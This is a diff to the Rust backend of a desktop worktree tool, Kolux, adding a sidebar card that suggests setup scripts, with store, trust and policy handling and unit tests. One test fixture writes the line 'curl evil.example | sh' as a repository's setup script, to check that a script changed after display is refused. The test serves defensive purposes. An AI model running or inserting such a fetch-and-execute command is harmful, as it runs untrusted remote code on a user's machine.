@@ -224,6 +224,7 @@ pub fn with_env(mut line: SetupLine, vars: &[(&str, String)], unset: &[&str]) ->
 /// SAFE-025: a shared kolux.yaml script runs only once its repository trusts it.
 #[tauri::command(async)]
 pub fn workspace_setup(store: StoreState<'_>, path: String, local: Option<String>, policy: Option<String>) -> Result<Option<SetupLine>, String> {
+    let (local, policy) = setup_inputs(&store, &path, local, policy);
     setup_for(&path, local, policy, &|root, kind, script| require_trust(&store, root, kind, script))
 }
 
@@ -450,6 +451,7 @@ pub fn script_trust_needed(store: StoreState<'_>, path: String, kind: String, ro
     kind_ok(&kind)?;
     let wt = Path::new(&path);
     let root = root.map(PathBuf::from).unwrap_or_else(|| main_folder(wt));
+    let (local, policy) = setup_inputs(&store, &path, local, policy);
     // git runs (the issue override check) before the store is locked
     let Some(script) = shared_script(&kind, &root, wt, local.as_deref(), policy.as_deref()) else { return Ok(None) };
     let store = store.lock().map_err(|_| "Kolux could not check this repository's trust, so its kolux.yaml scripts do not run".to_string())?;
@@ -688,6 +690,242 @@ pub fn setup_import(path: String, file: String) -> Result<(), String> {
     let yaml = std::fs::read_to_string(&target).unwrap_or_default();
     let next = import_into(&yaml, offer.setup.as_deref(), offer.teardown.as_deref())?;
     std::fs::write(&target, next).map_err(|e| format!("{} could not be written: {e}", crate::include::CONFIG_FILE))
+}
+
+// ---- PROJ-035: the sidebar card that suggests adding a setup script
+//
+// For a project with no setup script in effect, `suggest` says what to offer: the install command of
+// the package manager it declares, the setup another worktree tool's file holds (with the fields that
+// cannot come along), or an error when kolux.yaml cannot be read. Saving puts the script in Kolux's
+// own settings for the repository (the local setup `workspace_setup` already prefers), so the
+// suggestion ends by itself; dismissing is remembered per project.
+
+const LOCAL_KEY: &str = "localSetups";
+const DISMISSED_KEY: &str = "setupCardDismissed";
+const LOCAL_MAX: usize = 16 * 1024;
+/// The setup policy ("shared" and "shared-first" ignore a local setup) is one store setting, so the
+/// runner, the trust check and the sidebar card all work from the same answer.
+const POLICY_KEY: &str = "setupPolicy";
+/// package.json and kolux.yaml are read only up to this size by the card.
+const READ_MAX: u64 = 1024 * 1024;
+/// A field name from another tool's file is shown at most this long.
+const SHOWN_NAME_MAX: usize = 60;
+const MANAGERS: [&str; 4] = ["npm", "pnpm", "yarn", "bun"];
+
+#[derive(serde::Serialize, Debug, PartialEq, Clone)]
+#[serde(tag = "kind", rename_all = "camelCase")]
+pub enum SetupSuggestion {
+    None,
+    Install { command: String, manager: String },
+    Import { file: String, setup: String, skipped: Vec<String> },
+    Error { message: String },
+}
+
+/// The policy in force: the caller's, else the stored setting; blank is none.
+fn effective_policy(store: &crate::state::Store, asked: Option<String>) -> Option<String> {
+    asked.or_else(|| store.get(POLICY_KEY).ok().flatten()).map(|p| p.trim().to_string()).filter(|p| !p.is_empty())
+}
+
+/// What the runner and the trust check both start from: the repository's local setup and the policy
+/// in force. A setup saved from the sidebar card is the repository's local setup (PROJ-035).
+fn setup_inputs(store: &StoreState<'_>, path: &str, local: Option<String>, policy: Option<String>) -> (Option<String>, Option<String>) {
+    match store.lock() {
+        Ok(s) => (local.or_else(|| local_setup(&s, &main_folder(Path::new(path)))), effective_policy(&s, policy)),
+        Err(_) => (local, policy),
+    }
+}
+
+/// A policy that takes only kolux.yaml's script: a local setup is never run under it.
+fn ignores_local(policy: Option<&str>) -> bool {
+    matches!(policy, Some("shared") | Some("shared-first"))
+}
+
+/// The local setup kept for the repository whose main folder is `root`.
+pub fn local_setup(store: &crate::state::Store, root: &Path) -> Option<String> {
+    let all: std::collections::BTreeMap<String, String> = store.get(LOCAL_KEY).ok().flatten().and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default();
+    all.get(&crate::projects::name_key(&root.to_string_lossy())).filter(|s| !s.trim().is_empty()).cloned()
+}
+
+fn save_local(store: &crate::state::Store, root: &Path, script: &str) -> Result<(), String> {
+    let script = script.replace("\r\n", "\n");
+    let script = script.trim_matches('\n');
+    if script.trim().is_empty() || script.len() > LOCAL_MAX {
+        return Err(format!("A setup script has to be between 1 character and {} KB.", LOCAL_MAX / 1024));
+    }
+    let mut all: std::collections::BTreeMap<String, String> = store.get(LOCAL_KEY).ok().flatten().and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default();
+    all.insert(crate::projects::name_key(&root.to_string_lossy()), script.to_string());
+    store.set(LOCAL_KEY, &serde_json::to_string(&all).map_err(|e| e.to_string())?).map_err(|e| e.to_string())
+}
+
+fn dismissed_ids(store: &crate::state::Store) -> Vec<String> {
+    store.get(DISMISSED_KEY).ok().flatten().and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default()
+}
+
+/// A forgotten project's card state goes with it: its dismissal (by id) and its saved local setup
+/// (by the folder it lived in).
+pub fn prune_setup(store: &crate::state::Store, ids: &[String], roots: &[String]) -> Result<(), String> {
+    let before = dismissed_ids(store);
+    let kept: Vec<String> = before.iter().filter(|i| !ids.contains(i)).cloned().collect();
+    if kept.len() != before.len() {
+        store.set(DISMISSED_KEY, &serde_json::to_string(&kept).map_err(|e| e.to_string())?).map_err(|e| e.to_string())?;
+    }
+    let mut all: std::collections::BTreeMap<String, String> = store.get(LOCAL_KEY).ok().flatten().and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default();
+    let count = all.len();
+    for r in roots {
+        all.remove(&crate::projects::name_key(r));
+    }
+    if all.len() != count {
+        store.set(LOCAL_KEY, &serde_json::to_string(&all).map_err(|e| e.to_string())?).map_err(|e| e.to_string())?;
+    }
+    Ok(())
+}
+
+pub fn card_dismissed(store: &crate::state::Store, project_id: &str) -> bool {
+    dismissed_ids(store).iter().any(|i| i == project_id)
+}
+
+pub fn dismiss_card(store: &crate::state::Store, project_id: &str) -> Result<(), String> {
+    let mut ids = dismissed_ids(store);
+    if !ids.iter().any(|i| i == project_id) {
+        ids.push(project_id.to_string());
+        store.set(DISMISSED_KEY, &serde_json::to_string(&ids).map_err(|e| e.to_string())?).map_err(|e| e.to_string())?;
+    }
+    Ok(())
+}
+
+/// A file's text, refused past `max` bytes so an untrusted repository cannot make the card read
+/// without bound.
+fn read_capped(path: &Path, max: u64) -> std::io::Result<String> {
+    use std::io::Read;
+    let mut text = String::new();
+    let n = std::fs::File::open(path)?.take(max + 1).read_to_string(&mut text)?;
+    if n as u64 > max {
+        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, format!("it is larger than {} KB", max / 1024)));
+    }
+    Ok(text)
+}
+
+/// A field name from an untrusted file, cut to SHOWN_NAME_MAX characters (an ellipsis marks the cut).
+fn shown_name(name: &str) -> String {
+    if name.chars().count() <= SHOWN_NAME_MAX {
+        return name.to_string();
+    }
+    let mut cut: String = name.chars().take(SHOWN_NAME_MAX - 1).collect();
+    cut.push('…');
+    cut
+}
+
+/// The install command of the package manager the project declares: `packageManager` in
+/// package.json, else the lock file it keeps. Nothing declared, nothing guessed.
+fn install_command(root: &Path) -> Option<(String, String)> {
+    let text = read_capped(&root.join("package.json"), READ_MAX).ok()?;
+    let v: serde_json::Value = serde_json::from_str(&text).unwrap_or_default(); // unreadable JSON declares nothing; the lock file may still say
+    let declared = v["packageManager"].as_str().and_then(|s| s.split('@').next()).filter(|m| MANAGERS.contains(m)).map(str::to_string);
+    let locked = || {
+        [("pnpm-lock.yaml", "pnpm"), ("yarn.lock", "yarn"), ("bun.lock", "bun"), ("bun.lockb", "bun"), ("package-lock.json", "npm")].into_iter().find(|(f, _)| root.join(f).is_file()).map(|(_, m)| m.to_string())
+    };
+    let manager = declared.or_else(locked)?;
+    Some((format!("{manager} install"), manager))
+}
+
+/// What another tool's file holds that a local setup cannot take: every field beyond the setup
+/// command, named as it is in the file.
+fn skipped_fields(file: &str, text: &str, has_teardown: bool) -> Vec<String> {
+    let mut out = Vec::new();
+    if file.ends_with(".json") {
+        if let Some(obj) = serde_json::from_str::<serde_json::Value>(text).ok().and_then(|v| v.as_object().cloned()) {
+            for (k, val) in &obj {
+                match (k.as_str(), val.as_object()) {
+                    ("scripts", Some(s)) => out.extend(s.keys().filter(|n| *n != "setup" && *n != "archive").map(|n| format!("scripts.{n}"))),
+                    _ => out.push(k.clone()),
+                }
+            }
+        }
+    } else if let Ok(doc) = text.parse::<toml_edit::DocumentMut>() {
+        for (k, item) in doc.iter() {
+            match (k, item.as_table_like()) {
+                ("setup" | "cleanup", Some(t)) => out.extend(t.iter().filter(|(n, _)| *n != "script").map(|(n, _)| format!("{k}.{n}"))),
+                ("setup" | "cleanup", None) => {}
+                _ => out.push(k.to_string()),
+            }
+        }
+    }
+    let mut out: Vec<String> = out.iter().map(|n| shown_name(n)).collect();
+    if has_teardown {
+        out.push("teardown (a local setup has no archive script)".to_string());
+    }
+    out.truncate(20);
+    out
+}
+
+/// What the sidebar card offers for the repository at `root`: nothing when a setup script is already
+/// in effect (`local` is the one kept in Kolux's settings), else an import, else an install command.
+pub fn suggest(root: &Path, local: Option<&str>, policy: Option<&str>) -> SetupSuggestion {
+    let shared = match read_capped(&root.join(crate::include::CONFIG_FILE), READ_MAX) {
+        Ok(t) => setup_script(&t),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => None,
+        Err(e) => return SetupSuggestion::Error { message: format!("{} could not be read: {e}", crate::include::CONFIG_FILE) },
+    };
+    if pick_setup(local, shared, policy).is_some() {
+        return SetupSuggestion::None;
+    }
+    // Under a policy that takes only kolux.yaml's script a saved local setup would never run: no card.
+    if ignores_local(policy) {
+        return SetupSuggestion::None;
+    }
+    if let Some(o) = setup_imports(root).into_iter().find(|o| o.refused.is_none() && o.setup.is_some()) {
+        let text = read_capped(&root.join(&o.file), IMPORT_MAX).unwrap_or_default();
+        let skipped = skipped_fields(&o.file, text.trim_start_matches('\u{feff}'), o.teardown.is_some());
+        return SetupSuggestion::Import { file: o.file, setup: o.setup.unwrap_or_default(), skipped };
+    }
+    install_command(root).map_or(SetupSuggestion::None, |(command, manager)| SetupSuggestion::Install { command, manager })
+}
+
+/// Saves what the card offers (`from` is "install" or the import's file name) as the repository's
+/// local setup. The offer is worked out again here, so only what the project really offers is kept,
+/// and `shown` (the script the card displayed) has to be exactly what it is now: a file that changed
+/// since the card was drawn is refused, since a local setup runs without the trust prompt.
+pub fn save_suggestion(store: &crate::state::Store, root: &Path, from: &str, shown: &str, policy: Option<&str>) -> Result<(), String> {
+    let script = match suggest(root, local_setup(store, root).as_deref(), policy) {
+        SetupSuggestion::Install { command, .. } if from == "install" => command,
+        SetupSuggestion::Import { file, setup, .. } if file == from => setup,
+        SetupSuggestion::Error { message } => return Err(message),
+        _ => return Err("That suggestion is no longer offered.".to_string()),
+    };
+    if script != shown {
+        return Err("That suggestion changed since it was shown. Look at the card again before saving.".to_string());
+    }
+    save_local(store, root, &script)
+}
+
+/// PROJ-035: what the sidebar card should offer for the project at `path`, re-asked when the window
+/// is focused or another workspace is made active. A dismissed project gets nothing.
+#[tauri::command(async)]
+#[allow(dead_code)] // T-294: registered by the lib.rs hunk the coordinator applies
+pub fn setup_suggestion(store: StoreState<'_>, project_id: String, path: String, policy: Option<String>) -> Result<SetupSuggestion, String> {
+    let root = main_folder(Path::new(&path));
+    let (local, policy) = {
+        let s = store.lock().map_err(|e| e.to_string())?;
+        if card_dismissed(&s, &project_id) {
+            return Ok(SetupSuggestion::None);
+        }
+        (local_setup(&s, &root), effective_policy(&s, policy))
+    };
+    Ok(suggest(&root, local.as_deref(), policy.as_deref()))
+}
+
+#[tauri::command(async)]
+#[allow(dead_code)] // T-294: registered by the lib.rs hunk the coordinator applies
+pub fn setup_suggestion_save(store: StoreState<'_>, path: String, from: String, shown: String, policy: Option<String>) -> Result<(), String> {
+    let store = store.lock().map_err(|e| e.to_string())?;
+    let policy = effective_policy(&store, policy);
+    save_suggestion(&store, &main_folder(Path::new(&path)), &from, &shown, policy.as_deref())
+}
+
+#[tauri::command]
+#[allow(dead_code)] // T-294: registered by the lib.rs hunk the coordinator applies
+pub fn setup_suggestion_dismiss(store: StoreState<'_>, project_id: String) -> Result<(), String> {
+    dismiss_card(&*store.lock().map_err(|e| e.to_string())?, &project_id)
 }
 
 #[cfg(test)]
@@ -1118,5 +1356,207 @@ mod tests {
         assert_eq!(shared_script("issue", &root, &root, None, None).as_deref(), Some("work {{issue}}"));
         assert_eq!(shared_script("vm", &root, &root, None, None), None);
         let _ = std::fs::remove_dir_all(root);
+    }
+
+    #[test]
+    fn proj035_nothing_is_offered_while_a_setup_script_is_in_effect() {
+        let pkg: &[u8] = br#"{"packageManager":"pnpm@9.1.0"}"#;
+        let shared = tree(&[("package.json", pkg), ("kolux.yaml", b"scripts:\n  setup: make\n")]);
+        assert_eq!(suggest(&shared, None, None), SetupSuggestion::None, "kolux.yaml has one");
+        let bare = tree(&[("package.json", pkg)]);
+        assert_eq!(suggest(&bare, Some("make"), None), SetupSuggestion::None, "a local one is kept");
+        assert_eq!(suggest(&tree(&[("README.md", b"x")]), None, None), SetupSuggestion::None, "nothing to suggest");
+        for d in [shared, bare] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn proj035_the_install_command_is_the_declared_package_managers() {
+        let ask = |files: &[(&str, &[u8])]| {
+            let d = tree(files);
+            let s = suggest(&d, None, None);
+            let _ = std::fs::remove_dir_all(d);
+            s
+        };
+        let install = |c: &str, m: &str| SetupSuggestion::Install { command: c.into(), manager: m.into() };
+        assert_eq!(ask(&[("package.json", br#"{"packageManager":"pnpm@9.1.0"}"#)]), install("pnpm install", "pnpm"));
+        assert_eq!(ask(&[("package.json", br#"{"packageManager":"yarn@4.0.0+sha1.abc"}"#), ("package-lock.json", b"{}")]), install("yarn install", "yarn"), "the declaration beats a lock file");
+        assert_eq!(ask(&[("package.json", b"{}"), ("bun.lockb", b"x")]), install("bun install", "bun"));
+        assert_eq!(ask(&[("package.json", br#"{"packageManager":"rush@1"}"#), ("package-lock.json", b"{}")]), install("npm install", "npm"), "an unknown manager falls back to the lock file");
+        assert_eq!(ask(&[("package.json", b"{}")]), SetupSuggestion::None, "nothing declared, nothing guessed");
+        assert_eq!(ask(&[("package.json", b"not json"), ("pnpm-lock.yaml", b"x")]), install("pnpm install", "pnpm"));
+    }
+
+    #[test]
+    fn proj035_another_tools_setup_is_offered_with_the_fields_that_cannot_come_along() {
+        let d = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#), ("conductor.json", br#"{"scripts":{"setup":"npm ci","run":"npm start","archive":"rm -rf x"},"env":{"A":"1"}}"#)]);
+        let got = suggest(&d, None, None);
+        assert_eq!(got, SetupSuggestion::Import { file: "conductor.json".into(), setup: "npm ci".into(), skipped: vec!["scripts.run".into(), "env".into(), "teardown (a local setup has no archive script)".into()] }, "the import comes before the install command");
+        let c = tree(&[(".codex/environments/environment.toml", b"[setup]\nscript = \"make\"\nshell = \"bash\"\n[actions]\nx = 1\n")]);
+        match suggest(&c, None, None) {
+            SetupSuggestion::Import { setup, skipped, .. } => {
+                assert_eq!(setup, "make");
+                assert_eq!(skipped, ["setup.shell", "actions"]);
+            }
+            other => panic!("{other:?}"),
+        }
+        for d in [d, c] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn proj035_an_unreadable_kolux_yaml_is_an_error_that_clears_once_it_is_fixed() {
+        let d = tree(&[("kolux.yaml", &[0xff, 0xfe, 0x00][..]), ("package.json", br#"{"packageManager":"npm@10"}"#)]);
+        match suggest(&d, None, None) {
+            SetupSuggestion::Error { message } => assert!(message.starts_with("kolux.yaml could not be read"), "{message}"),
+            other => panic!("{other:?}"),
+        }
+        std::fs::write(d.join("kolux.yaml"), "worktree:\n  x: 1\n").unwrap();
+        assert!(matches!(suggest(&d, None, None), SetupSuggestion::Install { .. }), "recovers once the file is fixed");
+        let _ = std::fs::remove_dir_all(d);
+    }
+
+    #[test]
+    fn proj035_saving_from_the_card_ends_the_suggestion_and_a_dismissal_is_remembered_per_project() {
+        let profile = tree(&[]);
+        let repo = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#)]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        assert!(matches!(suggest(&repo, local_setup(&store, &repo).as_deref(), None), SetupSuggestion::Install { .. }));
+        assert!(save_suggestion(&store, &repo, "other.json", "pnpm install", None).is_err(), "only what is offered can be saved");
+        save_suggestion(&store, &repo, "install", "pnpm install", None).unwrap();
+        assert_eq!(local_setup(&store, &repo).as_deref(), Some("pnpm install"));
+        assert_eq!(suggest(&repo, local_setup(&store, &repo).as_deref(), None), SetupSuggestion::None, "the card goes away");
+        assert!(save_suggestion(&store, &repo, "install", "pnpm install", None).is_err(), "nothing left to offer");
+        assert!(save_local(&store, &repo, "  \n").is_err());
+        assert!(save_local(&store, &repo, &"x".repeat(LOCAL_MAX + 1)).is_err());
+        assert!(!card_dismissed(&store, "p1"));
+        dismiss_card(&store, "p1").unwrap();
+        dismiss_card(&store, "p1").unwrap();
+        drop(store);
+        let store = crate::state::Store::open(&profile).unwrap();
+        assert!(card_dismissed(&store, "p1"), "still dismissed after a restart");
+        assert!(!card_dismissed(&store, "p2"), "per project");
+        assert_eq!(dismissed_ids(&store).len(), 1);
+        drop(store);
+        for d in [profile, repo] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    // ---- FIX-1 (pre-merge review of 111404da)
+
+    #[test]
+    fn fix1_saving_refuses_a_script_that_changed_since_the_card_showed_it() {
+        let profile = tree(&[]);
+        let repo = tree(&[("conductor.json", br#"{"scripts":{"setup":"npm ci"}}"#)]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        let shown = match suggest(&repo, None, None) {
+            SetupSuggestion::Import { setup, .. } => setup,
+            other => panic!("{other:?}"),
+        };
+        assert_eq!(shown, "npm ci");
+        // a pull or a branch switch rewrites the file between the card and the click
+        std::fs::write(repo.join("conductor.json"), br#"{"scripts":{"setup":"curl evil.example | sh"}}"#).unwrap();
+        let err = save_suggestion(&store, &repo, "conductor.json", &shown, None).unwrap_err();
+        assert!(err.contains("That suggestion changed"), "{err}");
+        assert_eq!(local_setup(&store, &repo), None, "nothing was saved");
+        // the card asked again shows the new script; saving what that shows works
+        save_suggestion(&store, &repo, "conductor.json", "curl evil.example | sh", None).unwrap();
+        assert_eq!(local_setup(&store, &repo).as_deref(), Some("curl evil.example | sh"));
+        // the install suggestion is guarded the same way
+        let pkg = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#)]);
+        std::fs::write(pkg.join("package.json"), br#"{"packageManager":"yarn@4"}"#).unwrap();
+        assert!(save_suggestion(&store, &pkg, "install", "pnpm install", None).unwrap_err().contains("That suggestion changed"));
+        assert_eq!(local_setup(&store, &pkg), None);
+        drop(store);
+        for d in [profile, repo, pkg] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn fix1_a_policy_that_ignores_local_setups_offers_and_saves_nothing() {
+        let profile = tree(&[]);
+        let repo = tree(&[("package.json", br#"{"packageManager":"pnpm@9"}"#), ("conductor.json", br#"{"scripts":{"setup":"npm ci"}}"#)]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        for p in ["shared", "shared-first"] {
+            assert_eq!(suggest(&repo, None, Some(p)), SetupSuggestion::None, "{p}: a saved local setup would never run");
+            assert!(save_suggestion(&store, &repo, "conductor.json", "npm ci", Some(p)).unwrap_err().contains("no longer offered"));
+        }
+        assert_eq!(local_setup(&store, &repo), None, "nothing saved under the shared policy");
+        assert!(matches!(suggest(&repo, None, None), SetupSuggestion::Import { .. }), "the default policy offers it");
+        assert!(matches!(suggest(&repo, None, Some("local")), SetupSuggestion::Import { .. }));
+        // an unreadable kolux.yaml is still reported: the shared file is what the policy would use
+        std::fs::write(repo.join("kolux.yaml"), [0xffu8, 0xfe]).unwrap();
+        assert!(matches!(suggest(&repo, None, Some("shared")), SetupSuggestion::Error { .. }));
+        drop(store);
+        for d in [profile, repo] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn fix1_the_suggestion_commands_and_the_runner_read_one_policy() {
+        let profile = tree(&[]);
+        let store = crate::state::Store::open(&profile).unwrap();
+        assert_eq!(effective_policy(&store, None), None, "none set: the default");
+        assert_eq!(effective_policy(&store, Some("shared".into())).as_deref(), Some("shared"), "an argument wins");
+        store.set(POLICY_KEY, "shared-first").unwrap();
+        assert_eq!(effective_policy(&store, None).as_deref(), Some("shared-first"));
+        assert_eq!(effective_policy(&store, Some("local".into())).as_deref(), Some("local"));
+        store.set(POLICY_KEY, "  ").unwrap();
+        assert_eq!(effective_policy(&store, None), None, "a blank setting is no setting");
+        drop(store);
+        let _ = std::fs::remove_dir_all(profile);
+    }
+
+    #[test]
+    fn fix1_suggest_caps_what_it_reads_and_how_long_a_shown_name_is() {
+        // package.json and kolux.yaml past the cap are not read (nothing declared / an error to fix)
+        let big = vec![b' '; (READ_MAX + 1) as usize];
+        let huge_pkg = tree(&[("package.json", &big[..]), ("pnpm-lock.yaml", b"x")]);
+        assert_eq!(suggest(&huge_pkg, None, None), SetupSuggestion::None, "an oversized package.json declares nothing");
+        let huge_yaml = tree(&[("kolux.yaml", &big[..])]);
+        match suggest(&huge_yaml, None, None) {
+            SetupSuggestion::Error { message } => assert!(message.contains("larger than"), "{message}"),
+            other => panic!("{other:?}"),
+        }
+        // a field name from an untrusted file is cut before it is shown
+        let long = "k".repeat(500);
+        let body = format!("{{\"scripts\":{{\"setup\":\"make\"}},\"{long}\":1,\"scripts2\":{{}}}}");
+        let d = tree(&[("conductor.json", body.as_bytes())]);
+        match suggest(&d, None, None) {
+            SetupSuggestion::Import { skipped, .. } => {
+                assert!(skipped.iter().all(|n| n.chars().count() <= SHOWN_NAME_MAX), "{skipped:?}");
+                assert!(skipped.iter().any(|n| n.starts_with("kkkk") && n.ends_with('…')), "the cut one says it was cut: {skipped:?}");
+                assert!(skipped.contains(&"scripts2".to_string()), "short names are untouched");
+            }
+            other => panic!("{other:?}"),
+        }
+        for d in [huge_pkg, huge_yaml, d] {
+            let _ = std::fs::remove_dir_all(d);
+        }
+    }
+
+    #[test]
+    fn fix1_forgetting_a_project_prunes_its_dismissal_and_its_local_setup() {
+        let profile = tree(&[]);
+        let (a, b) = (tree(&[]), tree(&[]));
+        let store = crate::state::Store::open(&profile).unwrap();
+        for (id, d) in [("pa", &a), ("pb", &b)] {
+            dismiss_card(&store, id).unwrap();
+            save_local(&store, d, "make").unwrap();
+        }
+        prune_setup(&store, &["pa".to_string()], &[a.to_string_lossy().to_string()]).unwrap();
+        assert!(!card_dismissed(&store, "pa") && card_dismissed(&store, "pb"));
+        assert_eq!(local_setup(&store, &a), None);
+        assert_eq!(local_setup(&store, &b).as_deref(), Some("make"), "another project's setup stays");
+        prune_setup(&store, &[], &[]).unwrap();
+        drop(store);
+        for d in [profile, a, b] {
+            let _ = std::fs::remove_dir_all(d);
+        }
     }
 }
